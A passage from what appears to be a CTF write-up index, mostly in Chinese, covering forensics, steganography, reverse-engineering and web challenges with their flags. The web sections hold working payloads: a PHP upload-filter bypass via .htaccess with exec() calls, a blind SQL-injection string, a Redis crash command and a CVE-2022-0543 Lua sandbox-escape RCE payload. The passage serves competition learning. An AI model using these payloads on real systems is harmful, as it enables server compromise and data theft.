<p>\u53d1\u73b0\u662f\u6807\u51c6\u7684midi\u7684\u6e90\u6587\u4ef6\uff0c\u4f46\u662f\u4e0d\u80fd\u4ee5\u5143\u6570\u636e\u7684\u5f62\u5f0f\u5bfc\u5165\u5230au\uff0c\u5bfc\u5165\u5e93\u4e50\u961f\u65f6\u542c\u5176\u4e2d\u4e00\u4e2a\u97f3\u8f68\u7684\u58f0\u97f3\uff0c\u4e5f\u6ca1\u6709\u4ec0\u4e48\u95ee\u9898\u3002\u5e76\u4e14\u6ce2\u5f62\u56fe\u4e5f\u4e0d\u5177\u5907\u89c4\u5f8b\u3002</p> <p>\u4e8e\u662f\u60f3\u8d77velato\u8fd9\u4e2a\u5947\u8469\u7684\u7f16\u7a0b\u8bed\u8a00\uff0c\u8fd9\u4e2a\u7f16\u7a0b\u8bed\u8a00\u4e3b\u8981\u662f\u91c7\u7528\u4e86\u6240\u8c13\u7684\u97f3\u7b26\u7f16\u7a0b\uff0c\u53ef\u4ee5\u5230\u5b98\u7f51\u770b\u4e00\u4e0b\u624b\u518c\uff0c\u8fd9\u91cc\u76f4\u63a5\u4e0b\u8f7d\u7f16\u8bd1\u5668\uff0c\u5c1d\u8bd5\u7f16\u8bd1decode_it\uff0c\u770b\u770b\u6709\u5565</p> <p>\u6210\u529f\u7f16\u8bd1\uff0c\u8fd0\u884cdecode_it.exe\uff0c\u5e94\u8be5\u662fword\u7684\u538b\u7f29\u5305\u5bc6\u7801</p> <p> </p> <p>\u6210\u529f\u89e3\u538b\u538b\u7f29\u5305\u83b7\u5f97word\uff0c\u663e\u793a\u9690\u85cf\u5b57\u7b26\uff0c\u53ef\u4ee5\u770b\u5230\u91cc\u9762\u7684\u56fe\u7247\u548c\u4e00\u4e32\u5bc6\u6587</p> <p> </p> <p>\u56fe\u7247\u662f\u7cbe\u7075\u8bed\uff0c\u53c2\u7167\u7ffb\u8bd1\u8868\u5373\u53ef\u7ffb\u8bd1\u51faFLAGIS\uff0c\u90a3\u4e48\u540e\u9762\u90a3\u6bb5\u5bc6\u6587\u5e94\u8be5\u5c31\u662fflag\u7684\u5bc6\u6587\u4e86</p> <p> </p> <p>\u8fd9\u65f6\u5173\u6ce8\u5230rar\u538b\u7f29\u5305\u7684\u6ce8\u91ca\u90e8\u5206</p> <p>\u200b     </p> <p>\u53d1\u73b0\u7531\u7a7a\u683c\u5b57\u7b26\u548ctab\u5b57\u7b26\u7ec4\u6210\uff0c\u5c06\u7a7a\u683c\u5b57\u7b26\u66ff\u6362\u6210 . \uff0ctab\u5b57\u7b26\u66ff\u6362\u6210- \u6469\u65af\u89e3\u5bc6\u5373\u53ef</p> <p>\u200b     </p> <p>\u5df2\u77e5AES\u5bc6\u6587\u548ckey \u5728\u7ebf\u89e3\u5bc6\u5f97\u5230flag</p> <p></p>"},{"location":"Writeup/General%20Skills/%E5%B8%A6%E9%9F%B3%E4%B9%90%E5%AE%B6/#flag","title":"Flag","text":"<p>flag{mU51c_And_ch@ract0rs~}</p>"},{"location":"Writeup/General%20Skills/%E5%B8%A6%E9%9F%B3%E4%B9%90%E5%AE%B6/#reference","title":"Reference","text":"<p>Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw</p>"},{"location":"Writeup/General%20Skills/%E8%80%83%E5%8F%A4/","title":"\u8003\u53e4","text":"<p>Category: General Skills</p> <p>Source: \u7965\u4e91\u676f2021</p> <p>Author: unknown</p> <p>Score: 15</p>"},{"location":"Writeup/General%20Skills/%E8%80%83%E5%8F%A4/#description","title":"Description","text":"<p>\u5c0f\u660e\u5728\u5bb6\u91cc\u7ffb\u5230\u4e00\u53f0\u5f88\u53e4\u8001\u7684xp\u7b14\u8bb0\u672c\uff0c\u6362\u7535\u6c60\u4e4b\u540e\u53d1\u73b0\u53ef\u4ee5\u6b63\u5e38\u5f00\u673a\uff0c\u4f46\u662f\u53d1\u73b0\u786c\u76d8\u7a7a\u95f4\u4e0d\u8db3\u3002\u6e05\u7406\u8fc7\u7a0b\u4e2d\u5374\u53d1\u751f\u4e86\u4e00\u4e9b\u4e0d\u6109\u5feb\u7684\u4e8b\u60c5...</p> <p> zip</p>"},{"location":"Writeup/General%20Skills/%E8%80%83%E5%8F%A4/#solution","title":"Solution","text":"<p>Windows system image forensics.</p> <p>The given memory file is a Windows XP SP3 image file.</p> <p>Using <code>volatility</code> to find information in the image, the followings are important:</p> <pre><code>1. consoles\n    Gives some information about hacked by 1cepeak.\n2. pslist\n    Find 2 processes, Oneclickcleanup &amp; DumpIt\n3. filescan\n    Find the Oneclickcleanup.exe\n</code></pre> <p></p> <p>We should know that <code>DumpIt</code> is the process used to create system image, and this is not related to the solution.</p> <p>Then we should reverse <code>Oneclickcleanup.exe</code> and find the next step.</p> <p>First, we find a key <code>this_a_key</code>. The process uses this key to encrypt data.</p> <p></p> <p>We get yet another file using reverse.</p> <p>The given file is a <code>doc</code> file with <code>MS Word 6.0</code>. An old version of document. After the scan and analysis, no macro is found in the doc file, and as well as the hidden character.</p> <p></p> <p>After struggling several hours, I happened checked the <code>xor brute force</code> of the file, and I found something interesting.</p> <p>This part of the document can be <code>xor</code> using key <code>0x2d</code> and gives the flag.</p> <p></p> <p></p>"},{"location":"Writeup/General%20Skills/%E8%80%83%E5%8F%A4/#flag","title":"Flag","text":"<p>flag{8bedfdbb-ba42-43d1-858c-c2a5-5012d309}</p>"},{"location":"Writeup/General%20Skills/%E8%80%83%E5%8F%A4/#reference","title":"Reference","text":"<p>Writeup by Enderaoe Lyther</p>"},{"location":"Writeup/General%20Skills/%E8%BF%9B%E5%88%B6%E5%8F%8D%E8%BD%AC/","title":"\u8fdb\u5236\u53cd\u8f6c","text":"<p>Category: General Skills</p> <p>Source: \u7965\u4e91\u676f2020</p> <p>Author: unknown</p> <p>Score: 40</p>"},{"location":"Writeup/General%20Skills/%E8%BF%9B%E5%88%B6%E5%8F%8D%E8%BD%AC/#description","title":"Description","text":"<p>\u7535\u8111\u4e2d\u5230\u5e95\u4f7f\u7528\u7684\u662f\u4ec0\u4e48\u8fdb\u5236\u5462\uff1f\u771f\u662f\u9ebb\u70e6\uff0c\u6709\u65f6\u5019\u8fd8\u662f\u624b\u673a\u597d\u7528\u3002</p> <p>\u7ed3\u679c\u7528flag{}\u5305\u4f4f\uff0c\u5e76\u4e14\u5168\u4e3a\u5927\u5199</p>"},{"location":"Writeup/General%20Skills/%E8%BF%9B%E5%88%B6%E5%8F%8D%E8%BD%AC/#solution","title":"Solution","text":"<p>\u4e0b\u53d1\u7684\u6587\u4ef6\u663e\u793a\u635f\u574f\u65e0\u6cd5\u6253\u5f00\uff0c\u4f46\u662f\u624b\u673a\u53ef\u4ee5\u6b63\u5e38\u6253\u5f00\uff0c010edit\u6253\u5f00\u663e\u793aCRC\u9519\u8bef\uff0c\u4fee\u6539\u540e\u63d0\u793a\u9700\u8981\u5bc6\u7801\u89e3\u5bc6\uff0c\u4f46\u662f\u7206\u7834rar\u672a\u679c\uff0c\u4e8e\u662f\u60f3\u8d77\u6765\u53ef\u80fd\u662frar\u538b\u7f29\u4f2a\u52a0\u5bc6\uff0c\u5c1d\u8bd5\u4fee\u6539</p> <p> </p> <p>\u56fe\u793a\u6807\u8bb0\u4f4d\u7f6e\u7684D4\u4fee\u6539\u4e3aD0\u5373\u53ef\u89e3\u538b</p> <p>\u200b     </p> <p>\u4fee\u6539\u540e\u5373\u53ef\u89e3\u538b\u5f97\u5230flag.wav</p> <p> </p> <p>\u91cc\u9762\u662fflag.wav\uff0c\u4ee5\u5143\u6570\u636e\u7684\u6a21\u5f0f\u5bfc\u5165au\u5229\u7528AU\u8fdb\u884c\u97f3\u9891\u53cd\u8f6c\uff0c\u5f97\u5230\u4e00\u6bb5\u52c9\u5f3a\u80fd\u542c\u7684\u97f3\u9891\uff0c</p> <p>\u200b    </p> <p>0.5\u500d\u901f\u64ad\u653e\u540e\u4f7f\u7528qq\u97f3\u4e50\u542c\u6b4c\u8bc6\u66f2\uff0c\u5f97\u77e5\u662fToo Good At Goodbyes</p>"},{"location":"Writeup/General%20Skills/%E8%BF%9B%E5%88%B6%E5%8F%8D%E8%BD%AC/#flag","title":"Flag","text":"<p>flag{TOOGOODATGOODBYES}</p>"},{"location":"Writeup/General%20Skills/%E8%BF%9B%E5%88%B6%E5%8F%8D%E8%BD%AC/#reference","title":"Reference","text":"<p>Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw</p>"},{"location":"Writeup/General%20Skills/%E9%B8%A3%E9%9B%8F%E6%81%8B/","title":"\u9e23\u96cf\u604b","text":"<p>Category: General Skills</p> <p>Source: \u7965\u4e91\u676f2021</p> <p>Author: unknown</p> <p>Score: 5</p>"},{"location":"Writeup/General%20Skills/%E9%B8%A3%E9%9B%8F%E6%81%8B/#description","title":"Description","text":"<p>\u5728\u559c\u6b22\u7684\u4eba\u9762\u524d,\u6211\u53ef\u4e0d\u80fd\u2026\u2026\u4e22\u8138\u554a\u2026\u2026\u56e0\u4e3a\u6211,\u559c\u6b22\u9e23\u4eba\u541b\u2026\u2026\u2026\u2026</p> <p> zip</p>"},{"location":"Writeup/General%20Skills/%E9%B8%A3%E9%9B%8F%E6%81%8B/#_2","title":"\u9898\u76ee\u63cf\u8ff0","text":"<p>\u9898\u76ee\u7ed9\u4e86\u6211\u4eec\u4e00\u4e2adocx\uff0c\u4f46\u662f\u53cc\u51fb\u6253\u4e0d\u5f00\u3002</p>"},{"location":"Writeup/General%20Skills/%E9%B8%A3%E9%9B%8F%E6%81%8B/#_3","title":"\u6211\u7684\u89e3\u7b54","text":"<p>\u9996\u5148\u540e\u7f00\u6539zip\u89e3\u538b\u4e4b\uff0c\u53d1\u73b0<code>_rels</code>\u6587\u4ef6\u5939\u4e0b\u6709\u4e1c\u897f\uff1a<code>key.txt</code>\u548c\u4e00\u4e2aZIP\u538b\u7f29\u5305\u3002</p> <p>\u5c06<code>key.txt</code>\u62d6\u5165010 editor\u53d1\u73b0\u540e\u9762<code>E2 80 8D</code>\u548c<code>E2 80 8C</code>\u51fa\u73b0\u7684\u6700\u591a\uff0c\u731c\u6d4b\u662f\u96f6\u5bbd\u9690\u5199\uff1a</p> <p>https://330k.github.io/misc_tools/unicode_steganography.html</p> <p>\u5c06key.txt\u4e2d\u5185\u5bb9\u5168\u9009\u5e76\u590d\u5236\uff0c\u7c98\u8d34\u8fdb\u53bb\u89e3\u7801\u5c31\u6709\u5bc6\u7801\uff1a</p> <pre><code>Because I like naruto best\n</code></pre> <p>\u5229\u7528\u8fd9\u4e2a\u5bc6\u7801\u5c06ZIP\u538b\u7f29\u5305\u89e3\u538b\u4e4b\u540e\u662f\u5f88\u591a\u9e23\u4eba\u548c\u96cf\u7530\u7684\u5934\u50cf\uff0c\u800c\u4e14\u4ece\u524d\u9762\u7684\u6587\u4ef6\u4e0a\u6765\u770b\uff0c\u5e94\u8be5\u662f\u6309\u7167\u6570\u5b57\u987a\u5e8f\uff0c\u6bcf8\u4e2a\u4e00byte\uff0c\u96cf\u75300\uff0c\u9e23\u4eba1\u3002\u5982\u679c\u8fd9\u6837\u505a\u7684\u8bdd\uff0c\u89e3\u51fa\u524d\u4e09\u4e2a\u5b57\u6bcd\u662f<code>dat</code>\u3002\u5199\u811a\u672c\u89e3\u51fa\uff0c\u53d1\u73b0\u524d\u9762\u4e3a</p> <pre><code>data:image/png;base64,\n</code></pre> <p>\u5c06\u540e\u9762\u7684\u5185\u5bb9base64\u89e3\u7801\u4e4b\u540e\u5199\u5230PNG\u6587\u4ef6\uff0c\u5c31\u80fd\u770b\u5230flag\u3002</p> <p>\u8981\u773c\u529b\u770b</p> <p>\u811a\u672c\u5982\u4e0b\uff1a</p> <pre><code>from tqdm import tqdm\nfrom Crypto.Util.number import *\nimport base64\n\nwith open('_rels/love/out/0.png', 'rb') as f:\n    zero = f.read()\n\nans = ''\nfor i in tqdm(range(129488)):\n    with open(f'_rels/love/out/{i}.png', 'rb') as f:\n        s = f.read()\n    if (s == zero):\n        ans += '0'\n    else:\n        ans += '1'\n\ns = long_to_bytes(int(ans, 2))).decode()\ns = base64.b64decode(s[22:])\nwith open('gao_3.png', 'wb') as f:\n    f.write(s)\n</code></pre>"},{"location":"Writeup/General%20Skills/%E9%B8%A3%E9%9B%8F%E6%81%8B/#flag","title":"Flag","text":"<pre><code>flag{57dd74fb21bb1aee50f19421bf836f23}\n</code></pre>"},{"location":"Writeup/General%20Skills/%E9%B8%A3%E9%9B%8F%E6%81%8B/#reference","title":"Reference","text":"<p>Writeup from https://zhuanlan.zhihu.com/p/402713931</p>"},{"location":"Writeup/Reverse%20Engineering/apk1/","title":"apk1","text":"<p>Category: Reverse Engineering</p> <p>Source: \u7965\u4e91\u676f2020</p> <p>Author: unknown</p> <p>Score: 30</p>"},{"location":"Writeup/Reverse%20Engineering/apk1/#description","title":"Description","text":"<p>this is a easy apk</p>"},{"location":"Writeup/Reverse%20Engineering/apk1/#solution","title":"Solution","text":"<p>JEB\u6253\u5f00apk\uff0c\u53ef\u4ee5\u770b\u5230\u7a0b\u5e8f\u4e3b\u903b\u8f91\u7684\u5728native\u5c42\uff0c\u4f46\u662f\u8981\u6ce8\u610f\u7684\u662f\u8c03\u7528\u7684\u662fcheck\u51fd\u6570\u800c\u4e0d\u662fcheck1\u51fd\u6570</p> <p> </p> <p> </p> <p>IDA\u6253\u5f00so\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u76f4\u63a5\u6709check1\u51fd\u6570</p> <p> </p> <p>\u800ccheck\u51fd\u6570\u662f\u901a\u8fc7JNI_Onload\u4e2dregisterNatives\u51fd\u6570\u6ce8\u518c\u7684\uff0c\u53ef\u4ee5\u901a\u8fc7\u53cd\u6c47\u7f16\u627e\u5230\u5173\u952e\u4f4d\u7f6e</p> <p></p> <p></p> <p> </p> <p>check\u51fd\u6570\u4e3b\u903b\u8f91\u5982\u4e0b\uff1a</p> <p> </p> <p>\u7a0d\u4f5c\u5206\u6790\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u5bf9\u6211\u4eec\u7684\u8f93\u5165\u957f\u5ea6\u8fdb\u884c\u4e86\u5224\u65ad\u662f\u5426\u662f22\u4f4d\uff0c\u7136\u540e\u5bf9\u5176\u8fdb\u884c\u4e86hex\u8f6c\u5316\uff0c\u63a5\u7740rc4\u52a0\u5bc6\uff0c\u5bc6\u94a5\u662fflag\uff0c\u6700\u540e\u7528DES\u52a0\u5bc6\uff0c\u5bc6\u94a5\u8fd8\u662fflag\uff0c\u6700\u540e\u548c\u660e\u65870x99EDA1D941316EEA\u8fdb\u884c\u5bf9\u6bd4\u3002\u8981\u6ce8\u610f\u662f\u7684rc4\u751f\u6210\u65f6\u7528\u5230\u4e86crc\u6821\u9a8c\uff0c\u90a3\u4e48\u53ef\u4ee5\u7528\u52a8\u6001\u8c03\u8bd5\u53bb\u89e3\u5bc6rc4\u3002</p> <p></p> <pre><code>#-*- coding:utf-8   \nfrom numpy import*\nfrom Crypto.Cipher import DES\nfrom Crypto.Cipher import ARC4\nkey='666C6167'\ndes = DES.new(key, DES.MODE_ECB)\n\n\ncipher1='99EDA1D941316EEA'.decode('hex')\nplain1=des.decrypt(cipher1)\n\n\nprint(plain1.encode('hex'))\n#\u6c42\u51fades\u89e3\u5bc6\u660e\u6587\n</code></pre> <p>\u52a8\u6001\u8c03\u8bd5\u89e3\u51farc4\u5bc6\u6587\uff0c\u5373\u4e3aflag</p>"},{"location":"Writeup/Reverse%20Engineering/apk1/#flag","title":"Flag","text":"<p>flag{76952041E276E2BF}</p>"},{"location":"Writeup/Reverse%20Engineering/apk1/#reference","title":"Reference","text":"<p>Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw</p>"},{"location":"Writeup/Reverse%20Engineering/re1/","title":"re1","text":"<p>Category: Reverse Engineering</p> <p>Source: \u7965\u4e91\u676f2020</p> <p>Author: unknown</p> <p>Score: 15</p>"},{"location":"Writeup/Reverse%20Engineering/re1/#description","title":"Description","text":"<p>The program that can never be reversed\uff1f</p>"},{"location":"Writeup/Reverse%20Engineering/re1/#solution","title":"Solution","text":"<p>\u8f93\u5165\u7684\u5b57\u7b26\u4e32\uff0c\u6839\u636e\u6bcf\u4f4d\u7684\u5b57\u7b26\u4f1a\u7ecf\u8fc7\u4e00\u5806\u7684\u5904\u7406\uff0c\u7136\u540e\u8ddf\u76f8\u5e94\u7684\u6570\u636e\u4e00\u4f4d\u4e00\u4f4d\u5bf9\u6bd4\u3002\u53ef\u4ee5\u76f4\u63a5\u8f93\u51650-9 a-z\u7684\u5b57\u7b26\u4e32\u6765\u8fdb\u884c\u7206\u7834\u4e00\u4e0b\u5b57\u7b26\u5bf9\u5e94\uff0c\u4ece\u800c\u5f97\u5230flag\u3002</p> <p></p> <pre><code># 1234567890abcdefghijklmnopqrstuv\n\n# unsigned char ida_chars[] =\n# {\n# 0xE9, 0xEA, 0xEB, 0xEC, 0xED, 1-5\n# 0xEE, 0xEF, 0xF0, 0xF1, 0xE8, 6-0\n# 0x19, 0x1A, 0x1B, 0x1C, 0x1D, a-e\n# 0x1E, 0x1F, 0x20, 0x21, 0x22, f-j\n# 0x23, 0x24, 0x25, 0x26, 0x27, k-o\n# 0x28, 0x29, 0x2A, 0x2B, 0x2C, p-t\n# 0x2D, 0x2E u-v\n# };\n\n\n# cmpcode = 0xeb 0xf1 0x19 0xe8 0x1e 0x1e 0xf0 0xec 0xef 0x1e\n# 0xe9 0x1e 0xec 0xec 0xe8 0xec 0x19 0x19 0xee 0x1b \n# 0xef 0xef 0xec 0xea 0x1c 0xea 0xe8 0xeb 0xee 0xeb 0x1d 0xf1\nkey = [0xeb,0xf1,0x19,0xe8,0x1e,0x1e,0xf0,0xec,0xef,0x1e,\n0xe9,0x1e,0xec,0xec,0xe8,0xec,0x19,0x19,0xee,0x1b,\n0xef,0xef,0xec,0xea,0x1c,0xea,0xe8,0xeb,0xee,0xeb,0x1d,0xf1\n]\nflag = 'flag{'\nfor i in range(len(key)):\nif 0xe8&lt;=key[i]&lt;=0xf1:\nflag += chr(key[i] - 184)\nif 0x19&lt;=key[i]&lt;=(0x19+26):\nflag += chr(key[i] + 72)\nprint(flag+'}')\n</code></pre> <p></p>"},{"location":"Writeup/Reverse%20Engineering/re1/#flag","title":"Flag","text":"<p>flag{39a0ff847f1f4404aa6c7742d20363e9}</p>"},{"location":"Writeup/Reverse%20Engineering/re1/#reference","title":"Reference","text":"<p>Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw</p>"},{"location":"Writeup/Web%20Exploitation/easy_game/","title":"pcat/7/easygame","text":"<p>Name: easygame</p> <p>Type: web</p> <p>Author: kagi</p> <p>Desc: bypass me</p> <p>Link: http://139.9.251.90:8888/</p> <p>Attach: None</p> <p>Tips: None</p> <p>Total: 125 First: \u4f5a\u540d  Second: Ricky  Third: lu0sf</p>"},{"location":"Writeup/Web%20Exploitation/easy_game/#writeup","title":"Writeup","text":"<pre><code>&lt;?php\nhighlight_file(__FILE__);\n#### easy game\n\n$upload = 'upload/'.md5(\"2021\".$_SERVER['REMOTE_ADDR']);\n@mkdir($upload);\nfile_put_contents($upload.'/index.php', '');\nvar_dump($upload);\n\nif (isset($_POST['file']) &amp;&amp; isset($_POST['file'])){\n    if(preg_match('#.+\\.ph(p[3457]?|t|tml)$|/#is',$_POST['file'])){\n        die('file error');\n    }\n    if(preg_match('#\\w{2,}|[678]|&lt;\\?|/#',$_POST['content'])){\n        die('content error');\n    }\n    file_put_contents($upload.'/'.$_POST['file'], $_POST['content']);\n}\n\n\nif (isset($_GET['reset'])){\n    @rmdir($upload);\n} string(39) \"upload/c946d761bddc7564ff3e45a77a54ae13\"\n</code></pre> <p>We have access to the upload folder, but both the filename and the content are filtered. The question is to bypass the filter.</p>"},{"location":"Writeup/Web%20Exploitation/easy_game/#bypass-filename","title":"Bypass filename","text":"<p>The filename can't be uploaded using any kind of <code>.php</code> format. The only way is to upload a <code>.htaccess</code> file to identify the files in this folder are all executed using <code>php</code>.</p> <pre><code>.htaccess\nSetHandler application/x-httpd-php\n</code></pre> <p>After that, we can upload any filename and open it, the file would be resolved using <code>php</code>.</p> <p>But how can we upload the content in the <code>.htaccess</code>? Let's discuss below.</p>"},{"location":"Writeup/Web%20Exploitation/easy_game/#bypass-content","title":"Bypass content","text":"<p>The filter is strict, all 2 length printable characters are not valid. However, we can use an array to bypass this filter.</p> <pre><code>def gen_content(inp):\n    i = 1\n    for c in inp:\n        print('content['+str(i)+']=%'+hex(ord(c))[2:]+'&amp;', end='')\n    i += 1\n</code></pre> <p>Then we can upload any <code>php</code> script to server and gain RCE.</p> <p>How to find the flag? After several searching in the server, we discovered a <code>/readflag</code> ELF to read the flag file. Execute it to get the flag.</p>"},{"location":"Writeup/Web%20Exploitation/easy_game/#payload","title":"Payload","text":"<p><code>.htaccess</code> file upload:</p> <pre><code>file=.htaccess&amp;content[1]=&lt;&amp;content[2]=?&amp;content[3]=p&amp;content[4]=h&amp;content[5]=p&amp;content[6]=%0a&amp;content[7]=e&amp;content[8]=x&amp;content[9]=e&amp;content[10]=c&amp;content[11]=(&amp;content[12]=\"&amp;content[13]=l&amp;content[14]=s&amp;content[15]=\"&amp;content[16]=)&amp;content[17]=%0a&amp;content[18]=?&amp;content[19]=&gt;\n</code></pre> <p><code>payload</code> file upload:</p> <pre><code>file=payload&amp;content[1]=&lt;&amp;content[2]=?&amp;content[3]=p&amp;content[4]=h&amp;content[5]=p&amp;content[6]=%0a&amp;content[7]=e&amp;content[8]=c&amp;content[9]=h&amp;content[10]=o&amp;content[11]=%20&amp;content[12]=e&amp;content[13]=x&amp;content[14]=e&amp;content[15]=c&amp;content[16]=(&amp;content[17]=\"&amp;content[18]=/&amp;content[19]=r&amp;content[20]=e&amp;content[21]=a&amp;content[22]=d&amp;content[23]=f&amp;content[24]=l&amp;content[25]=a&amp;content[26]=g&amp;content[27]=\"&amp;content[28]=)&amp;content[29]=%0a&amp;content[30]=?&amp;content[31]=&gt;\n</code></pre>"},{"location":"Writeup/Web%20Exploitation/easy_game/#flag","title":"Flag","text":"<p>flag{46dd5c50-3e80-485e-80f4-f46b5d85f4b8}</p>"},{"location":"Writeup/%E8%99%8E%E7%AC%A6CTF2022/COMPASS%20WriteUp/","title":"\u864e\u7b26CTF - COMPASS WriteUp","text":"<p>(2022\u6570\u5b57\u4e2d\u56fd\u521b\u65b0\u5927\u8d5b\u864e\u7b26\u7f51\u7edc\u5b89\u5168\u8d5b\u9053)</p> \u6392\u540d(\u9ad8\u6821) \u6392\u540d(\u603b) \u89e3\u9898 \u5f97\u5206 31 42 6 1529 \u5206\u7c7b \u540d\u79f0 \u5206\u503c Web babysql 232 pt Misc Check in 31 pt Misc Plain Text 79 pt Misc Quest-Crash 99 pt Misc Quest-RCE 150 pt Misc handle 909 pt"},{"location":"Writeup/%E8%99%8E%E7%AC%A6CTF2022/COMPASS%20WriteUp/#web","title":"Web","text":""},{"location":"Writeup/%E8%99%8E%E7%AC%A6CTF2022/COMPASS%20WriteUp/#babysql","title":"babysql","text":"<p>username&amp;password \u6ce8\u5165  </p> <pre><code>'or~''and`password`COLLATE`utf8mb4_0900_as_cs`regexp'^[[prefix]]'and`password`regexp'(\n</code></pre> <p>\u901a\u8fc7 <code>[[prefix]]</code> \u76f2\u6ce8\uff0c401 \u4e3a failed\uff0c500 \u4e3a match\u3002 \u5f97\u5230 username: <code>QaY8TeFYzC67aeoO</code> password: <code>m52FPlDxYyLB^eIzAr!8gxh$</code></p>"},{"location":"Writeup/%E8%99%8E%E7%AC%A6CTF2022/COMPASS%20WriteUp/#misc","title":"Misc","text":""},{"location":"Writeup/%E8%99%8E%E7%AC%A6CTF2022/COMPASS%20WriteUp/#check-in","title":"Check in (\u4e00\u8840)","text":"<p>\u5168\u9009\u590d\u5236\u5feb\u901f\u7b7e\u5230\uff0c\u53f7\u79f0COMPASS\u7b7e\u5230\u56e2</p>"},{"location":"Writeup/%E8%99%8E%E7%AC%A6CTF2022/COMPASS%20WriteUp/#plain-text","title":"Plain Text","text":"<p>base64\u5f97\u89e3\u7801\u540e\u7684\u4e1c\u897f\u8bd5\u4e86\u5404\u79cd\u5e38\u89c1\u7f16\u7801\u52a0\u5bc6\uff0c\u672a\u679c\u3002 \u6253\u5f00\u8c37\u6b4c\u7ffb\u8bd1\uff0c\u6e90\u8bed\u8a00\u9009\u4fc4\u8bed\uff0c\u7136\u540e\u76f4\u63a5\u952e\u76d8\u8f93\u5165\uff0c\u5f97\u5230\u4e86flag\uff1a <code>\u6240\u6709\u7684\u5bc6\u7801\u90fd\u5f88\u7ec6\uff0c\u82f9\u679c\u548c\u897f\u74dc</code> </p> <p>\u4e3a\u4ec0\u4e48\u53d1\u73b0\u662f\u4fc4\u8bed\u5462\uff0c\u56e0\u4e3agoogle\u524d\u4e24\u4e2a\u8bcd\uff0c\u51fa\u6765\u4e86\u4fc4\u8bed\u6587\u7ae0  </p>"},{"location":"Writeup/%E8%99%8E%E7%AC%A6CTF2022/COMPASS%20WriteUp/#quest-crash","title":"Quest-Crash","text":"<pre><code>{\"query\":\"SET 114514 1919810\\nGET 114514\\nPING\"}\n</code></pre> <p>\u53ef\u4ee5\u6267\u884c\u591a\u6761\uff0c\u53ef\u4ee5\u7ed5\u8fc7\uff0c\u4e8e\u662f   </p> <pre><code>{\"query\":\"SET 114514 1919810\\nGET 114514\\nDEBUG SEGFAULT\"}\n</code></pre> <p>\u53ef\u4ee5\u5d29\u6389\u670d\u52a1\u3002</p>"},{"location":"Writeup/%E8%99%8E%E7%AC%A6CTF2022/COMPASS%20WriteUp/#quest-rce","title":"Quest-RCE","text":"<p>\u6839\u636e vulhub/CVE-2022-0543  \u627e\u5230payload  </p> <pre><code>eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0\n</code></pre> <p>\u9898\u76ee\u73af\u5883\u548c\u7248\u672c\u5b8c\u7f8e\u7b26\u5408\uff0c\u4e0d\u9700\u8981\u6539lib\u8def\u5f84\uff0c\u653e\u5230\u4e0a\u4e00\u9898\u7684\u8bf7\u6c42\u540e\u8fb9\u5c31\u53ef\u4ee5RCE  </p> <pre><code>{\"query\":\"SET 114514 1919810\\nGET 114514\\neval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"cat flag_UVEmnDKY4VHyUVRVj46ZeojgfZpxzG\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0\"}\n</code></pre>"},{"location":"Writeup/%E8%99%8E%E7%AC%A6CTF2022/COMPASS%20WriteUp/#handle","title":"handle (\u4e8c\u8840)","text":"<p>~~\uff08\u9694\u58c1\u67d0show\u5e73\u53f0\u4e0a\u5468\u521a\u505a\u8fc7\u7c7b\u4f3c\u7684\u9898\uff0c\u4e8e\u662f\u5f88\u5feb\u5c31\u628a\u5b57\u5178\u641e\u51fa\u6765\u4e86\uff0c\u4f46\u662f\u4ea4\u4e92\u5199\u4e86\u5f88\u4e45\u4e22\u6389\u4e86\u4e00\u8840\uff09~~ \u601d\u8def\u5c31\u662f\u627e\u4e00\u4e2a\u6709\u4f18\u52bf\u7684\u56fa\u5b9a\u8bcd\u5f00\u5934\uff0c\u7136\u540e\u6839\u636e\u8fd4\u56de\u7ed3\u679c\u5206\u679d(\u679d)\uff0c\u6839\u636e\u4e0d\u540c\u679d\u9009\u62e9\u4e0d\u540c\u7684\u5c1d\u8bd5\uff08\u526a\u679d\uff0c\u4f46\u662f\u5176\u5b9e\u662f\u53ea\u5904\u7406\u4e00\u679d\uff09\uff0c\u8fd9\u6837\u63a5\u4e0b\u6765\u8981\u5904\u7406\u7684\u91cd\u590d\u91cf\u5c31\u5c11\u5f88\u591a\uff0c\u91cd\u590d\u8fd9\u4e2a\u8fc7\u7a0b\u4e24\u6b21\uff0c\u51e0\u4e4e\u6bcf\u4e00\u4e2a\u53ef\u80fd\u7684\u8bcd\u90fd\u6709\u5bf9\u5e94\u5e8f\u5217\u4e86\u3002 \u7b80\u5355\u7edf\u8ba1\u4e00\u4e0b\u751f\u6bcd\u97f5\u6bcd\u97f3\u8c03\u7684\u9891\u7387\uff0c\u4f46\u662f\u4f9d\u636e\u8fd9\u4e2a\u627e\u51fa\u6bd4\u8f83\u5e38\u89c1\u7684\u8bcd\u8dd1\u4e09\u8f6e\u4e4b\u540e\u4f1a\u6709400+\u4e2a\u91cd\u590d\u7684\u8def\u7ebf\uff0c\u4e5f\u5c31\u662f\u8fd9400+\u4e2a\u8bcd\u5982\u679c\u62bd\u5230\u5927\u6982\u7387\u5931\u8d25\uff0c\u7b97\u4e00\u4e0b\u6210\u529f\u7387<code>pow(1-400/26000,512)</code>\u662f\u6050\u6016\u7684\u4e07\u5206\u4e4b\u4e09\uff0c\u4e8e\u662frandom choice\u5b57\u5178\u91cc\u7684\u8bcd\u5f00\u59cb\u8dd1\uff0c\u6700\u540e\u627e\u5230 \u9732\u5df1\u626c\u624d \u53ea\u6709\u4e00\u767e\u591a\u91cd\u590d\uff0c\u6210\u529f\u7387<code>pow(1-100/26000,512)</code>\u5df2\u7ecf\u63d0\u5347\u5230\u4e86\u5341\u5206\u4e4b\u4e00\uff0c\u51b3\u5b9a\u591a\u8dd1\u51e0\u6b21\u51faflag\u3002 P.S.\u56e0\u4e3a\u6210\u529f\u4e4b\u540e\u5c31\u6ca1\u6709 &gt; 